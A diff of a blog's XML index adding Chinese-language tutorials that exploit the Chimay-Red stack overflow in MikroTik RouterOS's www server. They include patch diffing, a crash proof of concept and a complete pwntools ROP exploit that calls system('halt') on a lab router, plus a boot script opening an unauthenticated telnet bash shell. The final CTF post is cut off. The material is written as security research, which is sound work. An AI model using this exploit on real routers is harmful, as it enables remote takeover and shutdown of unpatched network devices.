@@ -3,6 +3,239 @@
   
     
     <entry>
+      <title><![CDATA[一步一步 Pwn RouterOS之exploit构造]]></title>
+      <url>/2018/01/06/pwn_router_os_step_exp.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>前面已经分析完漏洞，并且搭建好了调试环境，本文将介绍如何利用漏洞写出 <code>exploit</code></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>控制 eip</strong></p>
+<p>看看我们现在所拥有的能力</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15151713048316b66g6te.png?imageslim" alt="paste image"></p>
+<p>我们可以利用 <code>alloca</code> 的 <code>sub esp *</code> 把栈抬高，然后往 那里写入数据。</p>
+<p>现在的问题是我们栈顶的上方有什么重要的数据是可以修改的。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515171497999x0f7vynu.png?imageslim" alt="paste image"></p>
+<p>一般情况下，我们是没办法利用的，因为 栈上面就是 堆， 而他们之间的地址是不固定的。 </p>
+<p>为了利用该漏洞，需要了解一点多线程实现的机制，不同线程拥有不同的线程栈， 而线程栈的位置就在 进程的 栈空间内。线程栈 按照线程的创建顺序，依次在 栈上排列。线程栈的大小可以指定。默认大概是 8MB.</p>
+<p>写了一个小程序，测试了一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">#include &lt;pthread.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/time.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#define MAX 10</div><div class="line">pthread_t thread[2];</div><div class="line">pthread_mutex_t mut;</div><div class="line">int number=0, i;</div><div class="line">void *thread1()</div><div class="line">&#123;</div><div class="line">		int a;</div><div class="line">        printf(&quot;thread1 %p\n&quot;, &amp;a);</div><div class="line">&#125;</div><div class="line">void *thread2()</div><div class="line">&#123;</div><div class="line">       	int a;</div><div class="line">        printf(&quot;thread2 %p\n&quot;, &amp;a);</div><div class="line">&#125;</div><div class="line">void thread_create(void)</div><div class="line">&#123;</div><div class="line">        int temp;</div><div class="line">        memset(&amp;thread, 0, sizeof(thread));          //comment1</div><div class="line">        /*创建线程*/</div><div class="line">        if((temp = pthread_create(&amp;thread[0], NULL, thread1, NULL)) != 0)       //comment2</div><div class="line">                printf(&quot;线程1创建失败!\n&quot;);</div><div class="line">        else</div><div class="line">                printf(&quot;线程1被创建\n&quot;);</div><div class="line">        if((temp = pthread_create(&amp;thread[1], NULL, thread2, NULL)) != 0)  //comment3</div><div class="line">                printf(&quot;线程2创建失败&quot;);</div><div class="line">        else</div><div class="line">                printf(&quot;线程2被创建\n&quot;);</div><div class="line">&#125;</div><div class="line">void thread_wait(void)</div><div class="line">&#123;</div><div class="line">        /*等待线程结束*/</div><div class="line">        if(thread[0] !=0) &#123;                   //comment4</div><div class="line">                pthread_join(thread[0],NULL);</div><div class="line">                printf(&quot;线程1已经结束\n&quot;);</div><div class="line">        &#125;</div><div class="line">        if(thread[1] !=0) &#123;                //comment5</div><div class="line">                pthread_join(thread[1],NULL);</div><div class="line">                printf(&quot;线程2已经结束\n&quot;);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        /*用默认属性初始化互斥锁*/</div><div class="line">        pthread_mutex_init(&amp;mut,NULL);</div><div class="line">        printf(&quot;我是主函数哦，我正在创建线程，呵呵\n&quot;);</div><div class="line">        thread_create();</div><div class="line">        printf(&quot;我是主函数哦，我正在等待线程完成任务阿，呵呵\n&quot;);</div><div class="line">        thread_wait();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>就是打印了两个线程中的栈内存地址信息，然后相减，就可以大概知道线程栈的大小。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515171997712kemr24ne.png?imageslim" alt="paste image"></p>
+<p>多次运行发现，线程栈之间应该是相邻的，因为打印出来的值的差是固定的。</p>
+<p>线程栈也是可以通过 <code>pthread_attr_setstacksize</code> 设置, 在 <code>RouterOs</code> 的 <code>www</code>的 <code>main</code> 函数里面就进行了设置。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515172296024czdw05qh.png?imageslim" alt="paste image"></p>
+<p>所以在 <code>www</code> 中的线程栈的大小 为 <code>0x20000</code>。</p>
+<p>当我们同时开启两个 <code>socket</code> 连接时，进程的栈布局</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515172554545mn6hijda.png?imageslim" alt="paste image"></p>
+<p>此时在 <code>线程 1</code> 中触发漏洞，我们就能修改 <code>线程 2</code> 的数据。</p>
+<p>现在的思路就很简单了，我们去修改 线程2 中的某个返回地址， 然后进行 <code>rop</code>.为了精确控制返回地址。先使用 <code>cyclic</code> 来确定返回地址的偏移.因为该程序线程栈的大小为 <code>0x20000</code> 所以用一个大一点的值试几次就能试出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def makeHeader(num):</div><div class="line">    return &quot;POST /jsproxy HTTP/1.1\r\nContent-Length: &quot; + str(num) + &quot;\r\n\r\n&quot;</div><div class="line"></div><div class="line"></div><div class="line">s1 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line">s2 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line"></div><div class="line"></div><div class="line">s1.send(makeHeader(0x20900))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.send(makeHeader(0x100))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line">s1.send(cyclic(0x2000))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line">s2.close()  # tigger </div><div class="line">pause()</div></pre></td></tr></table></figure></p>
+<p>崩溃后的位置<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203525302ht7bhy5u.png?imageslim" alt="paste image"></p>
+<p>然后用 <code>eip</code> 的值去计算下偏移</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203624359611r5xlg.png?imageslim" alt="paste image"></p>
+<p>然后调整 <code>poc</code> 测试一下<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203798622buq6fgpb.png?imageslim" alt="paste image"></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515203815266tllctxmq.png?imageslim" alt="paste image"></p>
+<p>ok, 接下来就是 <code>rop</code> 了。</p>
+<p><strong>rop</strong></p>
+<p>程序中没有 <code>system</code>, 所以我们需要先拿到 <code>system</code> 函数的地址，然后调用 <code>system</code> 执行命令即可。</p>
+<p>这里采取的 <code>rop</code> 方案如下。</p>
+<ul>
+<li>首先 通过 <code>rop</code> 调用 <code>strncpy</code> 设置我们需要的字符串（我们只有一次输入机会）</li>
+<li>然后调用 <code>dlsym</code> , 获取 <code>system</code> 的函数</li>
+<li>调用 <code>system</code> 执行命令</li>
+</ul>
+<p>使用 <code>strncpy</code> 设置我们需要的字符串的思路非常有趣。 因为我们只有一次的输入机会，而<code>dlsym</code> 和 <code>system</code> 需要的参数都是 字符串指针， 所以我们必须在 调用它们之前把 需要的字符串事先布置到已知的地址，使用 <code>strncpy</code> 我们可以使用 程序文件中自带的一些字符来拼接字符串。</p>
+<p>下面看看具体的 <code>exp</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515204586149s7886t42.png?imageslim" alt="paste image"></p>
+<p>首先这里使用 了 <code>ret 0x1bb</code> 用来把栈往下移动了一下，因为程序运行时会修改其中的一些值，导致 <code>rop</code> 链被破坏，把栈给移下去就可以绕过了。（这个自己调 <code>rop</code> 的时候注意看就知道了。）</p>
+<p>首先我们得设置 <code>system</code> 字符串 和 要执行的命令 这里为 <code>halt</code>(关机命令)。 以 <code>system</code> 字符串 的构造为例。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515204942477uir3mq2s.png?imageslim" alt="paste image"><br>分3次构造了 <code>system</code> 字符串，首先设置 <code>sys</code> , 然后 <code>te</code> , 最后 <code>m</code>.</p>
+<p>同样的原理设置好 <code>halt</code> , 然后调用 <code>dlsym</code> 获取  <code>system</code> 的地址。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15152051616411xqvk27b.png?imageslim" alt="paste image"><br>执行 <code>dlsym(0, &quot;system&quot;)</code> 即可获得 <code>system</code> 地址， 函数返回时保存在 <code>eax</code>, 所以接下来 在栈上设置好参数（<code>halt</code> 字符串的地址） 然后 <code>jmp eax</code> 即可。</p>
+<p>下面调试看看<br>首先 <code>ret 0x1bb</code>, 移栈<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205323369xyzljof1.png?imageslim" alt="paste image"></p>
+<p>然后是执行 <code>strncpy</code> 设置 <code>system</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205402433o5soeoxp.png?imageslim" alt="paste image"></p>
+<p>设置完后，我们就有了 <code>system</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205476774vuyjgswn.png?imageslim" alt="paste image"></p>
+<p>然后执行 <code>dlsym(0, &quot;system&quot;)</code> </p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205601990727005zg.png?imageslim" alt="paste image"></p>
+<p>执行完后， <code>eax</code> 保存着 <code>system</code> 函数的地址</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205780535xi426xmw.png?imageslim" alt="paste image"></p>
+<p>然后利用 <code>jmp eax</code> 调用 <code>system(&quot;halt&quot;)</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515205845365jiu6x47t.png?imageslim" alt="paste image"></p>
+<p>运行完后，系统就关机了。</p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>理解了多线程的机制。 对于不太好计算的，可以猜个粗略的值，然后使用 <code>cyclic</code> 来确定之。 <code>strncpy</code> 设置字符串的技巧不错。 <code>dlsym(0, &quot;system&quot;)</code> 可以用来获取函数地址。调试 <code>rop</code> 时要细心，<code>rop</code> 链被损坏使用 <code>ret *</code> 之类的操作绕过之。一些不太懂的东西，写个小的程序测试一下。</p>
+<p><strong>exp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def makeHeader(num):</div><div class="line">    return &quot;POST /jsproxy HTTP/1.1\r\nContent-Length: &quot; + str(num) + &quot;\r\n\r\n&quot;</div><div class="line"></div><div class="line"></div><div class="line">s1 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line">s2 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line"></div><div class="line"></div><div class="line">s1.send(makeHeader(0x20900))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.send(makeHeader(0x100))</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">strncpy_plt = 0x08050D00</div><div class="line">dlsym_plt = 0x08050C10</div><div class="line"></div><div class="line">system_addr = 0x0805C000 + 2</div><div class="line">halt_addr = 0x805c6e0</div><div class="line"></div><div class="line">#pop edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</div><div class="line"># .text:08059C03                 pop     ebx</div><div class="line"># .text:08059C04                 pop     esi</div><div class="line"># .text:08059C05                 pop     ebp</div><div class="line"># .text:08059C06                 retn</div><div class="line">ppp_addr = 0x08059C03</div><div class="line">pp_addr = 0x08059C04</div><div class="line">pppppr_addr = 0x080540b4</div><div class="line"># 0x0805851f : ret 0x1bb</div><div class="line">ret_38 = 0x0804ae8c</div><div class="line">ret_1bb = 0x0805851f</div><div class="line">ret = 0x0804818c</div><div class="line"># make system str</div><div class="line"></div><div class="line">payload = &quot;&quot;</div><div class="line">payload += p32(ret_1bb)   # for bad string</div><div class="line">payload += p32(ret)</div><div class="line">payload += &quot;A&quot; * 0x1bb</div><div class="line">payload += p32(ret) # ret</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(0x0805ab58)  # str syscall</div><div class="line">payload += p32(3)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr + 3)</div><div class="line">payload += p32(0x0805b38d)  # str tent</div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(system_addr + 5)</div><div class="line">payload += p32(0x0805b0ec)  # str mage/jpeg</div><div class="line">payload += p32(1)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(halt_addr)</div><div class="line">payload += p32(0x0805670f)  </div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(halt_addr + 2)</div><div class="line">payload += p32(0x0804bca1)  </div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line"># call dlsym(0, &quot;system&quot;) get system addr</div><div class="line">payload += p32(dlsym_plt)</div><div class="line">payload += p32(pp_addr)</div><div class="line">payload += p32(0)</div><div class="line">payload += p32(system_addr)</div><div class="line"></div><div class="line">payload += p32(0x0804ab5b)</div><div class="line">payload += &quot;BBBB&quot;  # padding ret</div><div class="line">payload += p32(halt_addr)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s1.send(cyclic(1612) + payload + &quot;B&quot; * 0x100)</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.close()</div><div class="line"></div><div class="line">pause()</div></pre></td></tr></table></figure>
+<p><strong>参考</strong></p>
+<p><a href="https://github.com/BigNerd95/Chimay-Red" target="_blank" rel="external">https://github.com/BigNerd95/Chimay-Red</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn_router_os </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> rop by dlsym </tag>
+            
+            <tag> rop by strncpy </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[一步一步 Pwn RouterOS之调试环境搭建&&漏洞分析&&poc]]></title>
+      <url>/2018/01/05/pwn_routeros_step_2_poc.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>本文分析 <code>Vault 7</code> 中泄露的 <code>RouterOs</code> 漏洞。漏洞影响 <code>6.38.5</code> 以下的版本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">What&apos;s new in 6.38.5 (2017-Mar-09 11:32):</div><div class="line">!) www - fixed http server vulnerability;</div></pre></td></tr></table></figure>
+<p>文中涉及的文件：</p>
+<p>链接: <a href="https://pan.baidu.com/s/1i5oznSh" target="_blank" rel="external">https://pan.baidu.com/s/1i5oznSh</a> 密码: 9r43</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>补丁对比&amp;&amp;漏洞分析</strong></p>
+<p>首先我们先来看看漏洞的原理，漏洞位于 <code>www</code> 文件。</p>
+<p>我们需要拿到 <code>www</code> 文件， 直接用 <code>binwalk</code> 提取出 <code>router os</code> 镜像文件的所有内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binwalk -Me mikrotik-6.38.4.iso</div></pre></td></tr></table></figure>
+<p>然后在提取出的文件中搜索即可。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515165746693cgztdv73.png?imageslim" alt="paste image"></p>
+<p>同样的方法提取出 <code>mikrotik-6.38.5.iso</code> 中的 <code>www</code> 文件。</p>
+<p>然后使用 <code>diaphora</code> 插件 对 这两个文件进行补丁比对 （因为 <code>6.38.5</code> 正好修复了漏洞）</p>
+<p>首先打开 <code>www_6384</code> (6.38.4版本的文件）， 然后使用 <code>diaphora</code> 导出 <code>sqlite</code> 数据库， <code>diaphora</code> 使用这个数据库文件进行 <code>diff</code> 操作。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166093523oxrusj58.png?imageslim" alt="paste image"></p>
+<p>然后打开 <code>www_6385</code> (6.38.5版本的文件），使用 <code>diaphora</code> 进行 <code>diff</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166195628syhogd51.png?imageslim" alt="paste image"></p>
+<p>找到相似度比较低的函数</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515165950046enxkrdzl.png?imageslim" alt="paste image"></p>
+<p>选中要查看差异的 条目 ，然后右键 </p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166256270id9v1odu.png?imageslim" alt="paste image"><br>可以选择查看 <code>diff</code> 的选项，使用 <code>diff pseudo-code</code> 就可以对 <code>伪c</code> 代码  <code>diff</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166371796rzohbnad.png?imageslim" alt="paste image"></p>
+<p>对比 <code>diff</code> 可以发现， 修复漏洞后的程序 没有了 <code>alloca</code>， 而是直接使用 <code>string::string</code> 构造了 字符串。</p>
+<p>下面直接分析 <code>www_6384</code> .</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166511848had11egp.png?imageslim" alt="paste image"><br>获取 <code>content-length</code> 的值之后，就传给了 <code>alloca</code> 分配内存。</p>
+<p>这里和前文不同的是，这里 <code>alloca</code>的参数是 无符号数。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166646043t0iiacnt.png?imageslim" alt="paste image"><br>所以我们能修改的是栈顶以上的数据，触发崩溃的poc.</p>
+<p><strong>poc</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">def makeHeader(num):</div><div class="line">    return &quot;POST /jsproxy HTTP/1.1\r\nContent-Length: &quot; + str(num) + &quot;\r\n\r\n&quot;</div><div class="line">s1 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line">s1.send(makeHeader(-1) + &quot;A&quot; * 1000)</div></pre></td></tr></table></figure>
+<p>注：ip 按实际情况设置</p>
+<p><strong>调试环境搭建&amp;&amp;Poc测试</strong></p>
+<p>首先我们得先安装 <code>routeros</code>， 使用 <code>vmware</code> 加载 <code>iso</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151516721340747r1xr5x.png?imageslim" alt="paste image"></p>
+<p>注： <code>routeros</code> 是 32 位的， 硬盘类型要为 <code>ide</code> 否则会找不到驱动。</p>
+<p>然后开启虚拟机，就会进入</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167336617v46o0ig8.png?imageslim" alt="paste image"></p>
+<p>按 <code>a</code>选择所有 ，然后按 <code>i</code> 进行安装，然后一直输入 <code>y</code> 确定即可。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167432691gf6rqz53.png?imageslim" alt="paste image"><br>安装完成后，重启，就会进入 登录界面了，使用 <code>admin</code> 和空密码登录即可。</p>
+<p>然后输入 <code>setup</code> ，接着输入 <code>a</code>, 按照提示配置好 <code>ip</code> 地址。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167541207kvenwy3d.png?imageslim" alt="paste image"><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167628938ab0thmw5.png?imageslim" alt="paste image"></p>
+<p>然后就可以使用 <code>ssh</code> 登录了。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167693696iosa57jc.png?imageslim" alt="paste image"></p>
+<p><code>Router Os</code> 对 <code>linux</code> 做了大量的裁剪，所以我们需要给系统增加一些文件方便进行调试，<code>busybox</code> 和 <code>gdbserver</code> （文件在百度云内）。</p>
+<p>要增加文件需要使用一个 <code>live-cd</code> 版的 <code>linux</code> 挂载 <code>router os</code> 的磁盘分区，增加文件。这里使用了 <code>ubuntu</code>. </p>
+<p>关闭虚拟机，设置光盘镜像，然后修改引导为 光盘即可进入 <code>live-cd</code>。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168110904jefbfa9f.png?imageslim" alt="paste image"></p>
+<p>选择 <code>try ubuntu</code>, 进入系统后，挂载 <code>/dev/sda1</code> 和 <code>/dev/sda2</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168515234ev3kupe7.png?imageslim" alt="paste image"></p>
+<p>把 <code>busybox</code> 和 <code>gdbserver</code> 放到 <code>bin</code> 目录(不是在<code>/dev/sda1</code>  就是在 <code>/dev/sda2</code> )下，然后在 <code>etc</code> 目录下新建 <code>rc.d/run.d/S99own</code>, 内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">mkdir /ram/mybin</div><div class="line">/flash/bin/busybox-i686 --install -s /ram/mybin</div><div class="line">export PATH=/ram/mybin:$PATH</div><div class="line">telnetd -p 23000 -l bash</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168595733d7l2hl3n.png?imageslim" alt="paste image"></p>
+<p><code>umount</code> 然后去掉光盘， 重新启动，应该就可以 <code>telnet 192.168.2.124 23000</code> 连接了。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168775379dbz2ytfl.png?imageslim" alt="paste image"></p>
+<p>此时使用 </p>
+<p><code>gdbserver.i686 192.168.2.124:5050 --attach $(pidof www)</code></p>
+<p>如图<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168937045jx5tlvv1.png?imageslim" alt="paste image"></p>
+<p>然后 gdb 连上去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">target remote 192.168.2.124:5050</div></pre></td></tr></table></figure>
+<p>-<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168983975bczey67j.png?imageslim" alt="paste image"></p>
+<p>运行<code>poc</code>,程序崩溃。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515169108092kn41spn7.png?imageslim" alt="paste image"></p>
+<p>参考：</p>
+<p><a href="https://github.com/BigNerd95/Chimay-Red/" target="_blank" rel="external">https://github.com/BigNerd95/Chimay-Red/</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn_router_os </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> diff </tag>
+            
+            <tag> setup env </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[一步一步 Pwn RouterOS之ctf题练手]]></title>
+      <url>/2018/01/05/pwn_with_routeros_ctf.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>本文目的是以一道比较简单的 <code>ctf</code> 的练手，为后面的分析  <code>RouterOs</code> 的 漏洞和写 <code>exploit</code> 打基础。</p>
+<p><code>Seccon CTF quals 2016</code> 的一道题。</p>
+<p>题目，idb 文件：</p>
+<p><a href="https://gitee.com/hac425/blog_data/tree/master/pwn_with_alloca" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/pwn_with_alloca</a></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先看看 <code>main</code> 函数的代码。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15151601513002tz99qyj.png?imageslim" alt="paste image"></p>
+<p>逻辑还是比较简单的获取输入后，简单的加了 <code>30</code> 就给 <code>alloca</code> 去分配空间，然后进入 <code>message</code> 函数。</p>
+<p><code>alloca</code> 函数是 从 栈上分配内存， 它分配内存是通过 <code>sub esp , *</code> 来实现的，我们可以转到汇编代码看看。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515160871164u36cvqez.png?imageslim" alt="paste image"></p>
+<p>可以看到调用 <code>alloca</code> 实际就是通过 <code>sub esp, eax</code> 来分配栈内存。</p>
+<p>我们输入的 <code>num</code> 是 <code>int</code> 类型的</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515161037092srnu0pi2.png?imageslim" alt="paste image"></p>
+<p>如果我们输入 <code>num</code> 为 负数， <code>sub esp</code> 就相当于 <code>add esp</code> 我们可以把栈指针往栈底移动。</p>
+<p>继续往下看</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515161251064vsu5zpke.png?imageslim" alt="paste image"></p>
+<p>接下来会调用 <code>message</code> 函数， 可以看到传给他的参数为 <code>esp + 23</code> 和 <code>num</code> ， 进入 <code>message</code> 函数 ，看看他的逻辑。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515161389377ru08eqe3.png?imageslim" alt="paste image"><br>首先读取 <code>n</code> 个字符 到 <code>buf</code> ， 这两个变量就是我们传入的参数。</p>
+<p>然后读入 <code>0x40</code> 个字符到  <code>message</code> 函数自己定义的局部变量中。</p>
